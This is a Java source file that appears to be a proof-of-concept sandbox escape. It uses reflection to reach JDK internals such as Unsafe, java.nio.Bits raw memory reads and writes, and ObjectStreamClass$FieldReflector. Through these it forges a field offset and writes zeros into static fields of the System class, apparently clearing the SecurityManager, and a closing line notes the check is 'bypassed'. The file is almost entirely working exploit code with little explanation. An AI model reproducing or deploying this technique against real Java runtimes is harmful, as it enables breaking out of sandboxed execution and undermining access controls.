package acc04j;

import java.lang.reflect.*;
import java.nio.ByteBuffer;

import java.io.*;

class Main {

  public static class Foo {
    public final int a;
    public final long b;

    public Foo() {
      this.a = 0x41414141;
      this.b = 0x4242424242424242L;
    }
  }

  public static void main(String[] argv) {
    try {
      ByteBuffer bb = ByteBuffer.allocateDirect(8192);
      bb.putInt(0x41414141);
      bb.putInt(0x42424242);
      System.out.println(bb.getClass());
      Field unsafe_field = bb.getClass().getDeclaredField("unsafe");
      System.out.println(unsafe_field);
      unsafe_field.setAccessible(true);
      Object unsafe = unsafe_field.get(null);
      System.out.println(unsafe);
      System.out.println(unsafe.getClass());
      //note: unfortunately, we can't reflect on it due to the access control checks in the jdk
      // otherwise the below would work

      Foo f = new Foo();
      System.out.println(f.a);
      System.out.println(f.b);

      /*
      Method getLong_2 = unsafe.getClass().getMethod("getLong", Object.class, long.class);
      Method getInt_2 = unsafe.getClass().getMethod("getInt", Object.class, long.class);
      Method objectFieldOffset_1 = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
      Method putInt_3 = unsafe.getClass().getMethod("putInt", Object.class, long.class, int.class);
      Method putLong_3 = unsafe.getClass().getMethod("putLong", Object.class, long.class, long.class);

      long off_a = (Long)objectFieldOffset_1.invoke(unsafe, f.getClass().getField("a"));
      long off_b = (Long)objectFieldOffset_1.invoke(unsafe, f.getClass().getField("b"));
      System.out.println(getInt_2.invoke(unsafe, f, off_a));
      System.out.println(getLong_2.invoke(unsafe, f, off_a+4));
      putInt_3.invoke(unsafe, f, off_a, 3333);
      putLong_3.invoke(unsafe, f, off_a+4, 4444);

      System.out.println(f.a);
      System.out.println(f.b);
      */
      System.out.println("==========");

      Class<?> Bits = Class.forName("java.nio.Bits");
      Method _getByte = Bits.getDeclaredMethod("_get", long.class);
      _getByte.setAccessible(true);
      Method _putByte = Bits.getDeclaredMethod("_put", long.class, byte.class);
      _putByte.setAccessible(true);

      Method address_0 = bb.getClass().getMethod("address"); //off-heap address
      address_0.setAccessible(true);

      System.out.println(Long.toHexString((Long)address_0.invoke(bb)));
      for (int i = 0; i < 8; i++) {
        System.out.println(_getByte.invoke(null, (Long)address_0.invoke(bb)+i));
      }

      System.out.println("==========");

      ObjectStreamField osf = new ObjectStreamField("s", long.class);
      ObjectStreamField[] osfarr = new ObjectStreamField[]{osf};

      Class<?> FieldReflector = Class.forName("java.io.ObjectStreamClass$FieldReflector");
      Constructor<?> FieldReflector_cons = FieldReflector.getDeclaredConstructors()[0];
      FieldReflector_cons.setAccessible(true);
      Object fr = FieldReflector_cons.newInstance(new Object[]{osfarr});
      System.out.println(fr);

      Field writeKeys_field = fr.getClass().getDeclaredField("writeKeys");
      writeKeys_field.setAccessible(true);
      writeKeys_field.set(fr, new long[]{116});

      Method setPrimFieldValues = fr.getClass().getDeclaredMethod("setPrimFieldValues", Object.class, byte[].class);
      setPrimFieldValues.setAccessible(true);


      System.out.println(System.err);
      System.out.println(System.getSecurityManager());

      byte[] zeros = new byte[8];
      setPrimFieldValues.invoke(fr, System.class, zeros);

      System.out.println(System.err);
      System.out.println(System.getSecurityManager());
      System.out.println(unsafe.getClass().getMethod("addressSize")); //bypassed
    } catch (Throwable t) {
      t.printStackTrace();
    }
  }
}
